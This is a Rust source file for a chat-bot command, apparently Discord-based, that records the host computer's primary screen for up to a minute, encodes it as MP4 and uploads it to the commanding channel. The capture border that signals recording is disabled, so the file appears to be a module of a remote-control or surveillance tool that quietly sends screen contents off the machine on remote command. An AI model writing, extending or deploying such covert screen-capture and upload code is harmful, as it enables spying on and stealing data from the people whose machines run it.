use crate::commands::*;
use anyhow::{anyhow, Result};
use async_trait::async_trait;
use std::sync::Arc;
use std::time::{Duration, Instant};
use std::fs;
use std::path::PathBuf;

use windows::core::HSTRING;
use windows::Win32::Media::MediaFoundation::*;
use windows::Win32::System::WinRT::{RoInitialize, RO_INIT_MULTITHREADED};
use windows_capture::{
    capture::{Context, GraphicsCaptureApiHandler},
    graphics_capture_api::InternalCaptureControl,
    monitor::Monitor,
    settings::{
        ColorFormat, CursorCaptureSettings, DirtyRegionSettings, DrawBorderSettings,
        MinimumUpdateIntervalSettings, SecondaryWindowSettings, Settings,
    },
};
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;

pub struct RecordCommand;

#[async_trait]
impl BotCommand for RecordCommand {
    fn name(&self) -> &str { "record" }
    fn description(&self) -> &str { "Record screen for specified seconds (MP4)" }
    fn category(&self) -> &str { "system" }
    fn usage(&self) -> &str { ".record <seconds>" }
    fn examples(&self) -> &'static [&'static str] { &[".record 5", ".record 10"] }
    fn aliases(&self) -> &'static [&'static str] { &["rec"] }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let seconds_arg = args.next().unwrap_or("5");
        let seconds: u64 = seconds_arg.parse().unwrap_or(5).clamp(1, 60);

        http.create_message(msg.channel_id.get(), &format!("Recording screen for {} seconds (MP4)...", seconds)).await?;

        let http_clone = http.clone();
        let channel_id = msg.channel_id.get();
        let seconds_u64 = seconds;
        
        let temp_dir = std::env::temp_dir();
        let file_name = format!("rec_{}.mp4", uuid::Uuid::new_v4());
        let file_path = temp_dir.join(&file_name);
        let file_path_str = file_path.to_string_lossy().to_string();

        // Run capturing in a separate thread
        std::thread::spawn(move || {
            let rt = tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
                .unwrap();
                
            match record_screen_mp4(seconds_u64, &file_path_str) {
                Ok(_) => {
                    // Read the file buffer
                    match fs::read(&file_path_str) {
                        Ok(data) => {
                            rt.block_on(async {
                                let mut retries = 3;
                                loop {
                                    match http_clone.create_message_with_file(channel_id, "Recording finished:", &data, "recording.mp4").await {
                                        Ok(_) => break,
                                        Err(e) => {
                                            if retries > 0 {
                                                retries -= 1;
                                                tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
                                                continue;
                                            }
                                            let _ = http_clone.create_message(channel_id, &format!("Failed to upload recording after retries: {}", e)).await;
                                            break;
                                        }
                                    }
                                }
                            });
                        }
                        Err(e) => {
                             rt.block_on(async {
                                 let _ = http_clone.create_message(channel_id, &format!("Failed to read recording file: {}", e)).await;
                            });
                        }
                    }
                    // Clean up
                    let _ = fs::remove_file(&file_path_str);
                }
                Err(e) => {
                    rt.block_on(async {
                         let _ = http_clone.create_message(channel_id, &format!("Recording failed: {}", e)).await;
                    });
                    // Clean up if exists
                    let _ = fs::remove_file(&file_path_str);
                }
            }
        });

        Ok(())
    }
}

// Media Foundation Helpers
fn pack_u64(high: u32, low: u32) -> u64 {
    ((high as u64) << 32) | (low as u64)
}

struct Mp4Writer {
    writer: IMFSinkWriter,
    stream_index: u32,
    start_time: Instant,
}

unsafe impl Send for Mp4Writer {}
unsafe impl Sync for Mp4Writer {}

impl Mp4Writer {
    fn new(path: &str, width: u32, height: u32) -> Result<Self, Box<dyn std::error::Error + Send + Sync>> {
        unsafe {
            let _ = MFStartup(MF_SDK_VERSION, MFSTARTUP_FULL);

            let mut attrs: Option<IMFAttributes> = None;
            MFCreateAttributes(&mut attrs, 1)?;
            let attrs = attrs.ok_or("Failed to create attributes")?;
            attrs.SetUINT32(&MF_READWRITE_ENABLE_HARDWARE_TRANSFORMS, 1)?;

            // Use Some(&attrs) to satisfy Option<&T>
            let writer = MFCreateSinkWriterFromURL(&HSTRING::from(path), None, Some(&attrs))?;

            let out_type = MFCreateMediaType()?;
            out_type.SetGUID(&MF_MT_MAJOR_TYPE, &MFMediaType_Video)?;
            out_type.SetGUID(&MF_MT_SUBTYPE, &MFVideoFormat_H264)?;
            out_type.SetUINT32(&MF_MT_AVG_BITRATE, 4_000_000)?;
            out_type.SetUINT64(&MF_MT_FRAME_SIZE, pack_u64(width, height))?;
            out_type.SetUINT64(&MF_MT_FRAME_RATE, pack_u64(30, 1))?;
            out_type.SetUINT64(&MF_MT_PIXEL_ASPECT_RATIO, pack_u64(1, 1))?;
            out_type.SetUINT32(&MF_MT_INTERLACE_MODE, MFVideoInterlace_Progressive.0 as u32)?;

            let in_type = MFCreateMediaType()?;
            in_type.SetGUID(&MF_MT_MAJOR_TYPE, &MFMediaType_Video)?;
            in_type.SetGUID(&MF_MT_SUBTYPE, &MFVideoFormat_RGB32)?;
            in_type.SetUINT64(&MF_MT_FRAME_SIZE, pack_u64(width, height))?;
            
            let stream_index = writer.AddStream(&out_type)?;
            writer.SetInputMediaType(stream_index, &in_type, None)?;
            writer.BeginWriting()?;

            Ok(Self { writer, stream_index, start_time: Instant::now() })
        }
    }

    fn write_frame(&self, frame: &mut windows_capture::frame::Frame) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        unsafe {
            let width = frame.width();
            let height = frame.height();
            let mut buffer = frame.buffer()?;
            let raw_data = buffer.as_raw_buffer();
            let data_len = raw_data.len() as u32;

            let mf_buffer = MFCreateMemoryBuffer(data_len)?;
            let mut dest_ptr = std::ptr::null_mut();
            mf_buffer.Lock(&mut dest_ptr, None, None)?;
            let dest_ptr = dest_ptr as *mut u8;

            // Flip image vertically (RGB32 is bottom-up in MF sometimes, or capture is top-down)
            let row_size = (width * 4) as usize;
            for y in 0..height as usize {
                let src_offset = y * row_size;
                let dest_offset = (height as usize - 1 - y) * row_size;
                std::ptr::copy_nonoverlapping(
                    raw_data.as_ptr().add(src_offset),
                    dest_ptr.add(dest_offset),
                    row_size,
                );
            }

            mf_buffer.Unlock()?;
            mf_buffer.SetCurrentLength(data_len)?;

            let sample = MFCreateSample()?;
            sample.AddBuffer(&mf_buffer)?;
            
            let timestamp = self.start_time.elapsed().as_nanos() / 100; // 100ns units
            sample.SetSampleTime(timestamp as i64)?;
            sample.SetSampleDuration(333333)?; // ~30 FPS duration in 100ns units

            self.writer.WriteSample(self.stream_index, &sample)?;
        }
        Ok(())
    }

    fn finish(&self) {
        unsafe {
            let _ = self.writer.Finalize();
            let _ = MFShutdown();
        }
    }
}

// Flags: (mp4_writer, duration)
struct Capture {
    mp4_writer: Arc<Mp4Writer>,
    duration: Duration,
    start_time: Instant,
}

impl GraphicsCaptureApiHandler for Capture {
    type Flags = (Arc<Mp4Writer>, Duration);
    type Error = Box<dyn std::error::Error + Send + Sync>;

    fn new(ctx: Context<Self::Flags>) -> Result<Self, Self::Error> {
        Ok(Self {
            mp4_writer: ctx.flags.0,
            duration: ctx.flags.1,
            start_time: Instant::now(),
        })
    }

    fn on_frame_arrived(
        &mut self,
        frame: &mut windows_capture::frame::Frame,
        capture_control: InternalCaptureControl,
    ) -> Result<(), Self::Error> {
        if self.start_time.elapsed() >= self.duration {
            capture_control.stop();
            return Ok(());
        }

        let _ = self.mp4_writer.write_frame(frame);
        Ok(())
    }
}

fn record_screen_mp4(seconds: u64, path: &str) -> Result<()> {
    unsafe { let _ = RoInitialize(RO_INIT_MULTITHREADED); }
    
    let monitor = Monitor::primary().map_err(|e| anyhow!("Monitor error: {}", e))?;
    // Some versions of windows-capture/monitor don't define width/height methods or result returns
    // Assuming user code is correct. If compile error, check monitor API.
    let width = monitor.width().map_err(|e| anyhow!("Width error: {}", e))?;
    let height = monitor.height().map_err(|e| anyhow!("Height error: {}", e))?;

    let mp4_writer = Arc::new(Mp4Writer::new(path, width, height).map_err(|e| anyhow!("Writer failed: {}", e))?);
    let duration = Duration::from_secs(seconds);

    let settings = Settings::new(
        monitor,
        CursorCaptureSettings::Default,
        DrawBorderSettings::WithoutBorder,
        SecondaryWindowSettings::Default,
        MinimumUpdateIntervalSettings::Default,
        DirtyRegionSettings::Default,
        ColorFormat::Rgba8,
        (mp4_writer.clone(), duration),
    );

    // Capture::start blocks
    Capture::start(settings)
        .map_err(|e| anyhow!("Capture error: {}", e))?;

    mp4_writer.finish();
    Ok(())
}
